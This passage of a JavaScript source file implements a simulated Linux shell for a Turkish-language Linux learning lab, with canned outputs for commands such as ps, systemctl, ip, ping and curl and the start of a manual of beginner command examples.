  su() { return fail('su: Authentication failure. Bu labda sudo kullan.'); },

  whoami() { return ok(this.user + '\n'); },
  id() { return ok(this.isRoot ? 'uid=0(root) gid=0(root) groups=0(root)\n' : 'uid=1000(burak) gid=1000(burak) groups=1000(burak),4(adm),27(sudo),999(docker)\n'); },
  groups() { return ok(this.isRoot ? 'root\n' : 'burak adm sudo docker\n'); },
  hostname() { return ok(HOSTNAME + '\n'); },
  uname(args) {
    const { flags } = parseOpts(args);
    if (flags.has('a')) return ok('Linux linuxlab 6.8.0-45-generic #45-Ubuntu SMP x86_64 GNU/Linux\n');
    if (flags.has('r')) return ok('6.8.0-45-generic\n');
    if (flags.has('m')) return ok('x86_64\n');
    return ok('Linux\n');
  },
  date(args) {
    const d = new Date();
    if (args[0] === '+%A') return ok(d.toLocaleDateString('en-US', { weekday: 'long' }) + '\n');
    if (args[0] === '+%F' || args[0] === '+%Y-%m-%d') return ok(d.toISOString().slice(0, 10) + '\n');
    if (args[0] === '+%H:%M') return ok(d.toTimeString().slice(0, 5) + '\n');
    return ok(d.toString().replace(/\s*\(.*\)$/, '') + '\n');
  },
  uptime() { return ok(' ' + new Date().toTimeString().slice(0, 8) + ' up 3 days,  4:12,  1 user,  load average: 1.02, 0.98, 0.95\n'); },
  history() { return ok(join(this.history.map((h, i) => String(i + 1).padStart(5) + '  ' + h))); },
  clear() { this.ui.clear = true; return ok(); },
  reset() { this.ui.clear = true; return ok(); },
  env() { return ok(join(Object.entries(this.env).map(([k, v]) => k + '=' + v))); },
  printenv(args) { return args[0] ? ok((this.env[args[0]] || '') + '\n') : COMMANDS.env.call(this); },
  export(args) {
    for (const a of args) { const k = a.indexOf('='); if (k > 0) this.env[a.slice(0, k)] = a.slice(k + 1); }
    return ok();
  },
  unset(args) { args.forEach(a => delete this.env[a]); return ok(); },
  alias(args) {
    if (!args.length) return ok(join(Object.entries(this.aliases).map(([k, v]) => `alias ${k}='${v}'`)));
    for (const a of args) {
      const k = a.indexOf('=');
      if (k > 0) this.aliases[a.slice(0, k)] = a.slice(k + 1);
      else if (this.aliases[a]) return ok(`alias ${a}='${this.aliases[a]}'\n`);
    }
    return ok();
  },
  unalias(args) { args.forEach(a => delete this.aliases[a]); return ok(); },
  which(args) {
    const out = []; let code = 0;
    for (const a of args) { if (COMMANDS[a]) out.push('/usr/bin/' + a); else code = 1; }
    return { out: join(out), err: '', code };
  },
  type(args) { return ok(join(args.map(a => (this.aliases[a] ? `${a} is aliased to '${this.aliases[a]}'` : COMMANDS[a] ? `${a} is /usr/bin/${a}` : `bash: type: ${a}: not found`)))); },
  true() { return ok(); },
  false() { return { out: '', err: '', code: 1 }; },
  sleep() { return ok(); },
  exit() { return ok('logout\n[Bu bir lab, kacis yok 😄 Gorev ekranina donmek icin alttaki sekmeleri kullan]\n'); },
  seq(args) {
    const n = args.map(Number);
    let [a, step, b] = n.length === 1 ? [1, 1, n[0]] : n.length === 2 ? [n[0], 1, n[1]] : n;
    const out = [];
    for (let i = a; step > 0 ? i <= b : i >= b; i += step) { out.push(i); if (out.length > 1000) break; }
    return ok(join(out));
  },
  tee(args, stdin) {
    const { flags, rest } = parseOpts(args);
    let err = '';
    for (const f of rest) { const e = this.writeFile(f, stdin || '', flags.has('a'), 'tee'); if (e) err += e + '\n'; }
    return { out: stdin || '', err, code: err ? 1 : 0 };
  },
  xargs(args, stdin) {
    const items = (stdin || '').split(/\s+/).filter(Boolean);
    const cmd = args.length ? args : ['echo'];
    return this.execSimple(cmd.concat(items), null, {});
  },
  bash(args) { if (!args.length) return ok('Zaten bash icindesin 🙂\n'); return this.runScript(args[0], args.slice(1), false); },
  sh(args) { return COMMANDS.bash.call(this, args); },
  source(args) { return this.runScript(args[0] || '', args.slice(1), false); },

  man(args) {
    const c = args[0];
    if (!c) return fail('What manual page do you want?');
    const info = typeof MANUAL !== 'undefined' && MANUAL[c];
    if (!info) return fail(`No manual entry for ${c}`, 16);
    return ok(`${c.toUpperCase()}(1)\n\nAD\n    ${c}. ${info.d}\n\nKULLANIM\n${info.u.map(u => '    ' + u).join('\n')}\n\nORNEKLER\n${info.e.map(e => '    $ ' + e).join('\n')}\n`);
  },
  help() {
    return ok('Linux Lab kabugu. Desteklenen komutlar\n\n' + Object.keys(COMMANDS).filter(c => !c.startsWith('_')).sort().join('  ') + '\n\nBir komut hakkinda bilgi icin man komut yaz, ornek man grep\nPipe |, yonlendirme > >> <, && || ; ve $(komut) desteklenir.\n');
  },

  ps(args) {
    const full = args.some(a => /aux|ef|-e/.test(a));
    const list = full ? this.procs : this.procs.filter(p => p.user === USER);
    const out = full ? ['USER         PID %CPU %MEM COMMAND'] : ['    PID TTY          TIME CMD'];
    for (const p of list) {
      out.push(full ? `${p.user.padEnd(10)} ${String(p.pid).padStart(5)} ${p.cpu.toFixed(1).padStart(4)} ${p.mem.toFixed(1).padStart(4)} ${p.cmd}` : `${String(p.pid).padStart(7)} pts/0    00:00:00 ${p.cmd.split(' ')[0]}`);
    }
    if (!full) out.push(`${String(4242).padStart(7)} pts/0    00:00:00 ps`);
    return ok(join(out));
  },
  top() {
    const sorted = [...this.procs].sort((a, b) => b.cpu - a.cpu);
    const load = sorted.reduce((s, p) => s + p.cpu, 0);
    const out = [`top - ${new Date().toTimeString().slice(0, 8)} up 3 days, 1 user, load average: ${(load / 100).toFixed(2)}`,
      `Tasks: ${this.procs.length} total`, `%Cpu(s): ${Math.min(99.9, load).toFixed(1)} us`, '',
      '    PID USER       %CPU %MEM COMMAND'];
    sorted.forEach(p => out.push(`${String(p.pid).padStart(7)} ${p.user.padEnd(10)} ${p.cpu.toFixed(1).padStart(4)} ${p.mem.toFixed(1).padStart(4)} ${p.cmd.split(' ')[0]}`));
    out.push('', '[Gercek top canli guncellenir ve q ile cikilir. Burada tek bir anlik goruntu var]');
    return ok(join(out));
  },
  kill(args) {
    const pids = args.filter(a => !a.startsWith('-')).map(Number);
    if (!pids.length) return fail('kill: usage: kill [-s sigspec | -n signum | -sigspec] pid');
    let err = '';
    for (const pid of pids) {
      const i = this.procs.findIndex(p => p.pid === pid);
      if (i < 0) { err += `bash: kill: (${pid}) - No such process\n`; continue; }
      const p = this.procs[i];
      if (pid === 1) { err += `bash: kill: (1) - init surecini oldurmek sistemi kapatir. Lab izin vermiyor.\n`; continue; }
      if (!this.isRoot && p.user !== USER) { err += `bash: kill: (${pid}) - Operation not permitted\n`; continue; }
      if (pid === 733) { err += `bash: kill: kendi kabugunu kapatmak uzere degilsin 🙂\n`; continue; }
      this.procs.splice(i, 1);
    }
    return { out: '', err, code: err ? 1 : 0 };
  },
  pkill(args) {
    const name = args.filter(a => !a.startsWith('-'))[0];
    if (!name) return fail('pkill: no matching criteria specified');
    const matches = this.procs.filter(p => p.cmd.includes(name) && p.pid !== 1 && p.pid !== 733);
    if (!matches.length) return { out: '', err: '', code: 1 };
    return COMMANDS.kill.call(this, matches.map(p => String(p.pid)));
  },
  pgrep(args) {
    const name = args.filter(a => !a.startsWith('-'))[0] || '';
    const m = this.procs.filter(p => p.cmd.includes(name));
    return { out: join(m.map(p => (args.includes('-a') ? p.pid + ' ' + p.cmd : String(p.pid)))), err: '', code: m.length ? 0 : 1 };
  },
  free() { return ok('               total        used        free      shared  buff/cache   available\nMem:           3.8Gi       1.6Gi       793Mi        12Mi       1.4Gi       2.2Gi\nSwap:          2.0Gi       128Mi       1.9Gi\n'); },
  df() { return ok('Filesystem      Size  Used Avail Use% Mounted on\n/dev/sda1        40G   31G  7.1G  82% /\ntmpfs           1.9G     0  1.9G   0% /dev/shm\n/dev/sdb1       100G   12G   83G  13% /data\n'); },
  du(args) {
    const t = args.filter(a => !a.startsWith('-'))[0] || '.';
    const n = this.node(this.resolve(t));
    if (!n) return fail(`du: cannot access '${t}': No such file or directory`);
    const size = x => (x.t === 'f' ? x.d.length : Object.values(x.c).reduce((s, c) => s + size(c), 4096));
    return ok(fmtSize(size(n), true) + '\t' + t + '\n');
  },
  systemctl(args) {
    const [action, unitRaw] = args.filter(a => !a.startsWith('-'));
    const unit = svcName(unitRaw);
    if (!action) return fail('systemctl list-units veya systemctl status servis');
    if (action === 'list-units' || action === '--failed' || args.includes('--failed')) {
      return ok(join(Object.entries(this.services).filter(([k]) => k !== 'ssh').map(([k, v]) => `${(k + '.service').padEnd(20)} loaded ${v === 'active' ? 'active   running' : v === 'failed' ? 'failed   failed ' : 'inactive dead   '}`)));
    }
    if (!unit) return fail('Too few arguments.');
    if (!(unit in this.services)) return fail(`Unit ${unit}.service could not be found.`, 4);
    const st = this.services[unit];
    if (action === 'status') {
      const dot = st === 'active' ? '●' : '×';
      const lines2 = [`${dot} ${unit}.service`, `     Loaded: loaded (/lib/systemd/system/${unit}.service; enabled)`,
        `     Active: ${st === 'active' ? 'active (running) since today' : st === 'failed' ? 'failed (Result: exit-code)' : 'inactive (dead)'}`];
      if (unit === 'nginx' && st === 'failed') lines2.push('    Process: 901 ExecStartPre=/usr/sbin/nginx -t (code=exited, status=1/FAILURE)', '', 'Ipucu: ayrinti icin journalctl -u nginx');
      return { out: join(lines2), err: '', code: st === 'active' ? 0 : 3 };
    }
    if (action === 'is-active') return { out: (st === 'failed' ? 'failed' : st) + '\n', err: '', code: st === 'active' ? 0 : 3 };
    if (['start', 'stop', 'restart', 'reload', 'enable', 'disable'].includes(action)) {
      if (!this.isRoot) return fail(`Failed to ${action} ${unit}.service: Access denied\nIpucu: servis yonetimi root yetkisi ister, sudo kullan`);
      if (action === 'stop') { this.services[unit] = 'inactive'; return ok(); }
      if (action === 'enable' || action === 'disable') return ok(`${action === 'enable' ? 'Created symlink' : 'Removed'} /etc/systemd/system/multi-user.target.wants/${unit}.service\n`);
      if (unit === 'nginx') {
        const e = nginxConfError(this);
        if (e) { this.services.nginx = 'failed'; return fail(`Job for nginx.service failed because the control process exited with error code.\nSee "systemctl status nginx.service" and "journalctl -xeu nginx.service" for details.`); }
      }
      this.services[unit] = 'active';
      return ok();
    }
    return fail(`Unknown command verb ${action}.`);
  },
  journalctl(args) {
    const ui = args.indexOf('-u');
    const unit = ui >= 0 ? svcName(args[ui + 1]) : null;
    if (unit === 'nginx') {
      const e = nginxConfError(this);
      const base = ['Oct 10 08:03:10 linuxlab systemd[1]: Starting A high performance web server...'];
      if (e || this.services.nginx === 'failed') {
        base.push(`Oct 10 08:03:10 linuxlab nginx[901]: nginx: [emerg] ${e || 'invalid configuration'}`,
          'Oct 10 08:03:10 linuxlab nginx[901]: nginx: configuration file /etc/nginx/nginx.conf test failed',
          'Oct 10 08:03:10 linuxlab systemd[1]: nginx.service: Failed with result \'exit-code\'.');
      }
      if (this.services.nginx === 'active') base.push('Oct 10 ' + new Date().toTimeString().slice(0, 8) + ' linuxlab systemd[1]: Started A high performance web server.');
      return ok(join(base));
    }
    if (unit === 'sshd' || unit === 'ssh') return ok(join(lines(LOGS.auth).filter(l => l.includes('sshd')).slice(-6)));
    if (unit) return ok(`-- No entries for ${unit} --\n`);
    return ok(LOGS.syslog);
  },
  nginx(args) {
    if (args.includes('-t')) {
      if (!this.isRoot) return fail('nginx: [alert] could not open error log file: open() "/var/log/nginx/error.log" failed (13: Permission denied)');
      const e = nginxConfError(this);
      if (e) return fail(`nginx: [emerg] ${e}\nnginx: configuration file /etc/nginx/nginx.conf test failed`);
      return { out: '', err: 'nginx: the configuration file /etc/nginx/nginx.conf syntax is ok\nnginx: configuration file /etc/nginx/nginx.conf test is successful\n', code: 0 };
    }
    return fail('nginx servisini systemctl ile yonet, ayar testi icin sudo nginx -t');
  },

  ip(args) {
    const sub = args[0] || '';
    if (['a', 'addr', 'address'].includes(sub)) {
      return ok('1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN\n    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\n    inet 127.0.0.1/8 scope host lo\n2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP\n    link/ether 52:54:00:12:34:56 brd ff:ff:ff:ff:ff:ff\n    inet 192.168.1.42/24 brd 192.168.1.255 scope global dynamic eth0\n    inet6 fe80::5054:ff:fe12:3456/64 scope link\n3: docker0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc noqueue state DOWN\n    link/ether 02:42:ac:11:00:01 brd ff:ff:ff:ff:ff:ff\n    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0\n4: wg0: <POINTOPOINT,NOARP,UP,LOWER_UP> mtu 1420 qdisc noqueue state UNKNOWN\n    inet 10.8.0.2/24 scope global wg0\n');
    }
    if (['r', 'route'].includes(sub)) return ok('default via 192.168.1.1 dev eth0 proto dhcp metric 100\n10.8.0.0/24 dev wg0 proto kernel scope link src 10.8.0.2\n10.20.0.0/16 via 10.8.0.1 dev wg0\n172.17.0.0/16 dev docker0 proto kernel scope link src 172.17.0.1 linkdown\n192.168.1.0/24 dev eth0 proto kernel scope link src 192.168.1.42 metric 100\n');
    if (['l', 'link'].includes(sub)) return ok('1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 state UNKNOWN\n2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 state UP\n3: docker0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 state DOWN\n4: wg0: <POINTOPOINT,NOARP,UP,LOWER_UP> mtu 1420 state UNKNOWN\n');
    if (['n', 'neigh'].includes(sub)) return ok('192.168.1.1 dev eth0 lladdr a4:91:b1:00:0a:01 REACHABLE\n192.168.1.10 dev eth0 lladdr 3c:22:fb:7a:10:22 STALE\n');
    return fail('Usage: ip [ addr | route | link | neigh ]');
  },
  ifconfig() { return ok('eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500\n        inet 192.168.1.42  netmask 255.255.255.0  broadcast 192.168.1.255\n\n[ifconfig eskidi, ip addr kullanmaya alis]\n'); },
  ping(args) {
    const { vals, rest } = parseOpts(args, 'cW');
    const host = rest[0];
    if (!host) return fail('ping: usage error: Destination address required', 2);
    const count = Math.min(parseInt(vals.c || '4', 10), 10);
    const map = { localhost: '127.0.0.1', 'google.com': '142.250.179.206', 'linuxlab': '127.0.1.1', 'intranet.local': null };
    const hostsFile = (this.node('/etc/hosts') || { d: '' }).d;
    const hm = lines(hostsFile).map(l => l.trim().split(/\s+/)).find(p => p.slice(1).includes(host));
    let ip = /^\d+\.\d+\.\d+\.\d+$/.test(host) ? host : hm ? hm[0] : map[host] !== undefined ? map[host] : /\./.test(host) ? '93.184.215.14' : null;
    if (!ip) return fail(`ping: ${host}: Name or service not known`, 2);
    if (/^10\.99\./.test(ip) || ip === '192.168.1.99') {
      return { out: `PING ${host} (${ip}) 56(84) bytes of data.\n\n--- ${host} ping statistics ---\n${count} packets transmitted, 0 received, 100% packet loss, time ${count * 1000}ms\n`, err: '', code: 1 };
    }
    const base = ip.startsWith('127.') ? 0.04 : ip.startsWith('192.168.') || ip.startsWith('10.') ? 0.6 : 11;
    const out = [`PING ${host} (${ip}) 56(84) bytes of data.`];
    const times = [];
    for (let i = 1; i <= count; i++) { const t = +(base + Math.random() * base * 0.3).toFixed(2); times.push(t); out.push(`64 bytes from ${ip}: icmp_seq=${i} ttl=${ip.startsWith('127.') ? 64 : 117} time=${t} ms`); }
    const min = Math.min(...times), max = Math.max(...times), avg = times.reduce((a, b) => a + b, 0) / times.length;
    out.push('', `--- ${host} ping statistics ---`, `${count} packets transmitted, ${count} received, 0% packet loss, time ${(count - 1) * 1001}ms`, `rtt min/avg/max/mdev = ${min.toFixed(3)}/${avg.toFixed(3)}/${max.toFixed(3)}/0.120 ms`);
    if (!vals.c) out.push('', '[Gercek Linux\'ta ping durmaz, Ctrl+C gerekir. Burada 4 paketle sinirli. Ileride -c kullan]');
    return ok(join(out));
  },
  traceroute(args) {
    const host = args.filter(a => !a.startsWith('-'))[0] || '8.8.8.8';
    return ok(`traceroute to ${host}, 30 hops max, 60 byte packets\n 1  _gateway (192.168.1.1)  0.512 ms  0.488 ms  0.470 ms\n 2  10.10.0.1 (10.10.0.1)  6.210 ms  6.180 ms  6.155 ms\n 3  ae1-ams-ix.isp.nl (80.249.208.1)  8.901 ms  8.870 ms  8.850 ms\n 4  * * *\n 5  ${host}  11.204 ms  11.190 ms  11.150 ms\n`);
  },
  mtr(args) { return COMMANDS.traceroute.call(this, args); },
  ss(args) {
    return ok('Netid State  Recv-Q Send-Q Local Address:Port  Peer Address:Port Process\nudp   UNCONN 0      0      127.0.0.53%lo:53       0.0.0.0:*     users:(("systemd-resolve",pid=588))\nudp   UNCONN 0      0            0.0.0.0:51820    0.0.0.0:*\ntcp   LISTEN 0      128          0.0.0.0:2222     0.0.0.0:*     users:(("sshd",pid=412))\ntcp   LISTEN 0      5            0.0.0.0:8000     0.0.0.0:*     users:(("python3",pid=1024))\ntcp   LISTEN 0      4096       127.0.0.1:5432     0.0.0.0:*     users:(("postgres",pid=640))\n' + (this.services.nginx === 'active' ? 'tcp   LISTEN 0      511          0.0.0.0:80       0.0.0.0:*     users:(("nginx",pid=1501))\n' : '') + 'tcp   ESTAB  0      0       192.168.1.42:2222 192.168.1.10:51000 users:(("sshd",pid=2100))\n');
  },
  netstat(args) { return COMMANDS.ss.call(this, args); },
  curl(args) {
    const { flags, rest } = parseOpts(args, 'oXHd');
    const url = rest[0];
    if (!url) return fail('curl: try \'curl --help\' for more information', 2);
    const head = flags.has('I');
    const m = /^(?:https?:\/\/)?([^/:]+)(?::(\d+))?(\/.*)?$/.exec(url);
    if (!m) return fail(`curl: (3) URL using bad/illegal format`, 3);
    const [, host, port, path = '/'] = m;
    const local = ['localhost', '127.0.0.1', '192.168.1.42', 'linuxlab'].includes(host);
    if (local && (!port || port === '80')) {
      if (this.services.nginx !== 'active') return fail(`curl: (7) Failed to connect to ${host} port 80 after 0 ms: Couldn't connect to server`, 7);
      if (head) return ok('HTTP/1.1 200 OK\nServer: nginx/1.24.0 (Ubuntu)\nContent-Type: text/html\nContent-Length: 39\n');
      const f = this.node('/var/www/html' + (path === '/' ? '/index.html' : path));
      if (!f || f.t !== 'f') return ok('<html><head><title>404 Not Found</title></head><body><center><h1>404 Not Found</h1></center></body></html>\n');
      return ok(f.d);
    }
    if (local && port === '8000') return ok(head ? 'HTTP/1.0 200 OK\nServer: SimpleHTTP/0.6 Python/3.12.3\n' : '<!DOCTYPE HTML>\n<html><body><h1>Directory listing for /</h1><ul><li>app.py</li></ul></body></html>\n');
    if (local) return fail(`curl: (7) Failed to connect to ${host} port ${port}: Connection refused`, 7);
    if (host === 'ifconfig.me' || host === 'icanhazip.com') return ok('84.104.22.17\n');
    if (host.startsWith('api.')) return ok('{"status":"ok","version":"2.4.1","uptime":86400}\n');
    if (head) return ok('HTTP/2 200\ncontent-type: text/html; charset=UTF-8\nserver: ECS\n');
    return ok(`<!doctype html><html><head><title>${host}</title></head><body>Lab ortaminda dis dunya simule ediliyor.</body></html>\n`);
  },
  wget(args) { return COMMANDS.curl.call(this, args.filter(a => !a.startsWith('-'))); },
  dig(args) {
    const host = args.filter(a => !a.startsWith('+') && !a.startsWith('@'))[0] || '.';
    const short = args.includes('+short');
    const hostsFile = (this.node('/etc/hosts') || { d: '' }).d;
    const db = { 'google.com': '142.250.179.206', 'example.com': '93.184.215.14', 'github.com': '140.82.121.4', 'paloaltonetworks.com': '34.107.151.202' };
    let ip = db[host];
    if (!ip && host.endsWith('.local')) {
      if (short) return ok('');
      return ok(`; <<>> DiG 9.18 <<>> ${host}\n;; ->>HEADER<<- opcode: QUERY, status: NXDOMAIN\n;; Not: dig /etc/hosts dosyasina bakmaz, DNS sunucusuna sorar. getent hosts ${host} dene.\n`);
    }
    if (!ip) ip = '93.184.215.14';
    if (short) return ok(ip + '\n');
    return ok(`; <<>> DiG 9.18 <<>> ${host}\n;; ->>HEADER<<- opcode: QUERY, status: NOERROR\n\n;; ANSWER SECTION:\n${host}.\t\t300\tIN\tA\t${ip}\n\n;; Query time: 12 msec\n;; SERVER: 192.168.1.1#53(192.168.1.1) (UDP)\n`);
    void hostsFile;
  },
  nslookup(args) { const r = COMMANDS.dig.call(this, [args[0] || '', '+short']); return ok(`Server:\t\t192.168.1.1\nAddress:\t192.168.1.1#53\n\nName:\t${args[0]}\nAddress: ${r.out.trim() || '** server can\'t find ' + args[0] + ': NXDOMAIN'}\n`); },
  host(args) { const r = COMMANDS.dig.call(this, [args[0] || '', '+short']); return ok(r.out.trim() ? `${args[0]} has address ${r.out.trim()}\n` : `Host ${args[0]} not found: 3(NXDOMAIN)\n`); },
  getent(args) {
    if (args[0] === 'hosts') {
      const hostsFile = (this.node('/etc/hosts') || { d: '' }).d;
      const hm = lines(hostsFile).map(l => l.trim().split(/\s+/)).find(p => p.slice(1).includes(args[1]));
      if (hm) return ok(hm[0] + '\t' + args[1] + '\n');
      const r = COMMANDS.dig.call(this, [args[1] || '', '+short']);
      return r.out.trim() ? ok(r.out.trim() + '\t' + args[1] + '\n') : { out: '', err: '', code: 2 };
    }
    if (args[0] === 'passwd') return COMMANDS.grep.call(this, [args[1] ? '^' + args[1] + ':' : '', '/etc/passwd']);
    return fail('getent: hosts veya passwd destekleniyor');
  },
  ssh(args) {
    const target = args.filter(a => !a.startsWith('-'))[0] || '';
    if (/192\.168\.1\.10|localhost/.test(target)) return fail(`ssh: connect to host ${target.split('@').pop()} port 22: Connection refused\nIpucu: bu sunucunun ssh portu farkli olabilir, ss -tlnp ile bak`);
    return fail(`ssh: connect to host ${target.split('@').pop()} port 22: Connection timed out`);
  },
  nano(args) {
    const f = args.filter(a => !a.startsWith('-'))[0];
    if (!f) return fail('nano: dosya adi ver, ornek nano notlar.txt');
    const abs = this.resolve(f);
    const n = this.node(abs);
    if (n && n.t === 'd') return fail(`nano: ${f} is a directory`);
    if (n && !this.canRead(n)) return fail(`nano: ${f}: Permission denied`);
    this.ui.editor = { path: abs, display: f, content: n ? n.d : '', root: this.isRoot };
    return ok();
  },
  vim(args) { const r = COMMANDS.nano.call(this, args); if (!r.err) this.ui.editorVim = true; return r; },
  vi(args) { return COMMANDS.vim.call(this, args); },
  less(args, stdin) { return COMMANDS.cat.call(this, args, stdin); },
  more(args, stdin) { return COMMANDS.cat.call(this, args, stdin); },
  stat(args) {
    const f = args[0];
    const n = this.node(this.resolve(f || ''));
    if (!n) return fail(`stat: cannot statx '${f}': No such file or directory`);
    return ok(`  File: ${f}\n  Size: ${n.t === 'd' ? 4096 : n.d.length}\t${n.t === 'd' ? 'directory' : 'regular file'}\nAccess: (0${(n.m & 0o777).toString(8)}/${modeStr(n)})  Uid: (${n.o})\nModify: ${new Date(n.ts).toISOString()}\n`);
  },
  file(args) {
    return ok(join(args.map(f => { const n = this.node(this.resolve(f)); if (!n) return `${f}: cannot open`; if (n.t === 'd') return `${f}: directory`; if (n.d.startsWith('#!')) return `${f}: Bourne-Again shell script, ASCII text executable`; if (n.d.startsWith('\x7fELF')) return `${f}: ELF 64-bit LSB pie executable, x86-64`; return `${f}: ${n.d.length ? 'ASCII text' : 'empty'}`; })));
  },
  diff(args) {
    const [a, b] = args.filter(x => !x.startsWith('-'));
    const ra = this.readFile(a || '', 'diff'), rb = this.readFile(b || '', 'diff');
    if (ra.err) return fail(ra.err, 2); if (rb.err) return fail(rb.err, 2);
    const la = lines(ra.data), lb = lines(rb.data);
    const out = [];
    const max = Math.max(la.length, lb.length);
    for (let i = 0; i < max; i++) {
      if (la[i] === lb[i]) continue;
      if (la[i] !== undefined && lb[i] !== undefined) out.push(`${i + 1}c${i + 1}`, '< ' + la[i], '---', '> ' + lb[i]);
      else if (la[i] !== undefined) out.push(`${i + 1}d${lb.length}`, '< ' + la[i]);
      else out.push(`${la.length}a${i + 1}`, '> ' + lb[i]);
    }
    return { out: join(out), err: '', code: out.length ? 1 : 0 };
  },
  rev(args, stdin) { const { texts } = readInputs(this, args, stdin, 'rev'); return ok(join(lines(texts.join('')).map(l => [...l].reverse().join('')))); },
  base64(args, stdin) {
    const { flags, rest } = parseOpts(args);
    const { texts, errs } = readInputs(this, rest, stdin, 'base64');
    const t = texts.join('');
    try { return { out: flags.has('d') ? decodeURIComponent(escape(atob(t.trim()))) : btoa(unescape(encodeURIComponent(t))) + '\n', err: errs, code: 0 }; }
    catch (e) { return fail('base64: invalid input'); }
  },
  submit(args) {
    const ans = args.join(' ').trim();
    if (!ans) return fail('submit: cevabi yaz, ornek submit 42');
    this.lastSubmit = ans;
    this.ui.submit = ans;
    return ok(`📨 Cevap gonderildi ${ans}\n`);
  },
  cowsay(args) { return ok(cowsay(args.join(' ') || 'Moo! Linux ogreniyorum')); },
  fortune() { return ok(FORTUNES[Math.floor(Math.random() * FORTUNES.length)] + '\n'); },
  sl() { return ok('      ====        ________                ___________\n  _D _|  |_______/        \\__I_I_____===__|_________|\n   |(_)---  |   H\\________/ |   |        =|___ ___|\n   /     |  |   H  |  |     |   |         ||_| |_||\n  |      |  |   H  |__--------------------| [___] |\n  | ________|___H__/__|_____/[][]~\\_______|       |\n  |/ |   |-----------I_____I [][] []  D   |=======|_\n__/ =| o |=-~~\\  /~~\\  /~~\\  /~~\\ ____Y___________|__\n |/-=|___|=    ||    ||    ||    |_____/~\\___/\n  \\_/      \\O=====O=====O=====O_/      \\_/\n\nls yazacaktin galiba 🚂\n'); },
  neofetch() { return ok('        .-/+oossssoo+/-.         burak@linuxlab\n    `:+ssssssssssssssssss+:`     --------------\n  -+ssssssssssssssssssyyssss+-   OS: Ubuntu 24.04 LTS x86_64\n.ossssssssssssssssssdMMMNysssso. Kernel: 6.8.0-45-generic\n/ssssssssssshdmmNNmmyNMMMMhssss/ Shell: bash 5.2\n+ssssssssshmydMMMMMMMNddddyssss+ Terminal: Linux Lab PWA\n/sssssssshNMMMyhhyyyyhmNMMMNhss/ CPU: Virtual CPU 2 cores\n.ssssssssdMMMNhsssssssssshNMMMd. Memory: 1.6GiB / 3.8GiB\n'); },
  matrix() { let o = ''; for (let i = 0; i < 8; i++) { let l = ''; for (let j = 0; j < 40; j++) l += Math.random() < 0.5 ? String.fromCharCode(0x30a0 + Math.floor(Math.random() * 96)) : ' '; o += l + '\n'; } return ok(o + '\nWake up, Neo...\n'); },
};

/* Komut sozlugu, man ve sozluk sekmesi icin */
const MANUAL = {
  pwd: { d: 'Bulundugun dizinin tam yolunu yazdirir', u: ['pwd'], e: ['pwd'] },
  ls: { d: 'Dizin icerigini listeler', u: ['ls [-l] [-a] [-h] [dizin]', '-l uzun format, -a gizliler dahil, -h okunabilir boyut'], e: ['ls', 'ls -la', 'ls -lh /var/log'] },
  cd: { d: 'Dizin degistirir', u: ['cd dizin', 'cd .. bir ust dizin', 'cd ~ ev dizini', 'cd - onceki dizin'], e: ['cd /var/log', 'cd ..', 'cd'] },
  cat: { d: 'Dosya icerigini yazdirir veya birlestirir', u: ['cat [-n] dosya...'], e: ['cat /etc/hostname', 'cat -n notes.txt'] },
  echo: { d: 'Metni yazdirir', u: ['echo metin', 'echo $DEGISKEN'], e: ['echo "merhaba"', 'echo $HOME', 'echo "satir" >> dosya.txt'] },
  touch: { d: 'Bos dosya olusturur ya da zaman damgasini gunceller', u: ['touch dosya'], e: ['touch yeni.txt'] },
  mkdir: { d: 'Dizin olusturur', u: ['mkdir [-p] dizin', '-p ara dizinleri de olusturur'], e: ['mkdir lab', 'mkdir -p a/b/c'] },
  rmdir: { d: 'Bos dizini siler', u: ['rmdir dizin'], e: ['rmdir eski'] },
  rm: { d: 'Dosya veya dizin siler. Geri donusum kutusu yoktur', u: ['rm [-r] [-f] hedef', '-r dizinleri ozyinelemeli siler, -f sormadan siler'], e: ['rm dosya.txt', 'rm -r eski_dizin'] },
  cp: { d: 'Kopyalar', u: ['cp [-r] kaynak hedef'], e: ['cp a.txt b.txt', 'cp -r proje proje_yedek'] },
  mv: { d: 'Tasir veya yeniden adlandirir', u: ['mv kaynak hedef'], e: ['mv eski.txt yeni.txt', 'mv dosya.txt ~/Documents/'] },
  head: { d: 'Dosyanin ilk satirlarini gosterir', u: ['head [-n N] dosya'], e: ['head -n 5 /var/log/syslog', 'head -3 dosya'] },
  tail: { d: 'Dosyanin son satirlarini gosterir', u: ['tail [-n N] [-f] dosya', '-f dosyayi canli takip eder'], e: ['tail -n 20 /var/log/syslog', 'tail -f /var/log/auth.log'] },
  wc: { d: 'Satir, kelime, karakter sayar', u: ['wc [-l] [-w] [-c] dosya'], e: ['wc -l /etc/passwd', 'cat dosya | wc -w'] },
  grep: { d: 'Metin icinde desen arar', u: ['grep [-i] [-v] [-n] [-c] [-r] [-o] [-E] desen [dosya]', '-i harf duyarsiz, -v eslesmeyenler, -c sayi, -n satir no, -r ozyinelemeli'], e: ['grep error /var/log/syslog', 'grep -ic error /var/log/syslog', 'grep -r TODO ~'] },
  sort: { d: 'Satirlari siralar', u: ['sort [-n] [-r] [-u] [-k N] [-t ayrac]'], e: ['sort isimler.txt', 'sort -k2 -n -r scores.txt'] },
  uniq: { d: 'Ardisik tekrarlari teklestirir. Genelde sort ile kullanilir', u: ['uniq [-c] [-d]'], e: ['sort fruits.txt | uniq -c'] },
  cut: { d: 'Satirlardan alan veya karakter keser', u: ['cut -d ayrac -f alanlar', 'cut -c 1-5'], e: ['cut -d: -f1 /etc/passwd', 'cut -d, -f1,3 cities.csv'] },
  tr: { d: 'Karakter donusturur veya siler', u: ['tr set1 set2', 'tr -d set'], e: ['echo merhaba | tr a-z A-Z', "tr -d '\\r'"] },
